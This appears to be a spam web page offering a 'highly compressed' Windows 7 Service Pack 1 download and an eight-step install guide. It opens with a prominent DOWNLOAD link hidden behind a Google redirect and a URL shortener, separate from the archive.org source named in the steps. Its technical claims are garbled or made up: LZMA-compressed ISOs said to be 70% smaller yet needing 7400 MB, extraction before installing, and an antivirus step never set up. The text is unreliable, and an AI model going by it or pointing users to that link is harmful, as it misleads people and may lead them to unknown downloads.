Windows 7 Service Pack 1 (SP1) is an important update that includes previously released security, performance, and stability updates for Windows 7. Installing SP1 helps keep Windows 7 up to date and more secure. However, downloading and installing SP1 can take a long time and consume a lot of disk space. If you want to save time and disk space, you can download and install Windows 7 SP1 in a highly compressed format. Here are the steps to do so:
 
**DOWNLOAD ✺✺✺ [https://www.google.com/url?q=https%3A%2F%2Fbyltly.com%2F2uK546&sa=D&sntz=1&usg=AOvVaw2nt-H0R6SFUyuBe4kY8pta](https://www.google.com/url?q=https%3A%2F%2Fbyltly.com%2F2uK546&sa=D&sntz=1&usg=AOvVaw2nt-H0R6SFUyuBe4kY8pta)**


 
1. Go to the [Windows 7 Professional SP1 (32 bit and 64 bit ISOs)](https://archive.org/details/win-7-pro-32-64-iso) page on the Internet Archive website. This page contains legitimate ISO files for both 32-bit and 64-bit versions of Windows 7 Professional with SP1 included. The ISO files are highly compressed using the LZMA algorithm, which reduces their size by about 70%.[^3^]
2. Select the Download link that corresponds to your version of Windows 7. For example, if you have a 64-bit version of Windows 7, select the win-7-pro-x64.iso link. The download will start automatically.
3. Save the ISO file to your PC. You will need about 7400 MB of free disk space for the 64-bit version or about 4100 MB for the 32-bit version.
4. After the download is complete, you will need to extract the ISO file using a tool that supports LZMA compression, such as [7-Zip](https://www.7-zip.org/). Right-click on the ISO file and select 7-Zip > Extract Here. This will create a folder with the same name as the ISO file.
5. Inside the folder, you will find a file called ei.cfg. This file determines which edition of Windows 7 will be installed. If you want to install Windows 7 Professional, you can leave this file as it is. If you want to install another edition, such as Ultimate, Home Premium, or Home Basic, you will need to delete this file.
6. Now you are ready to install Windows 7 SP1 from the extracted folder. You can either burn the folder to a DVD using a tool like [ImgBurn](https://www.imgburn.com/), or create a bootable USB drive using a tool like [Rufus](https://rufus.ie/). Make sure your PC is plugged in to power and youâre connected to the Internet.
7. Restart your PC and boot from the DVD or USB drive. Follow the instructions to install Windows 7 SP1. You might be asked for an admin password or to confirm your choice. It takes about 30 minutes to install, and you'll need to restart your computer about halfway through the installation.
8. After SP1 is installed, sign in to your PC. You might see a notification indicating whether the update was successful. If you disabled your antivirus software before the installation, make sure you turn it back on.

Congratulations! You have successfully downloaded and installed Windows 7 Service Pack 1 (SP1) in a highly compressed format.
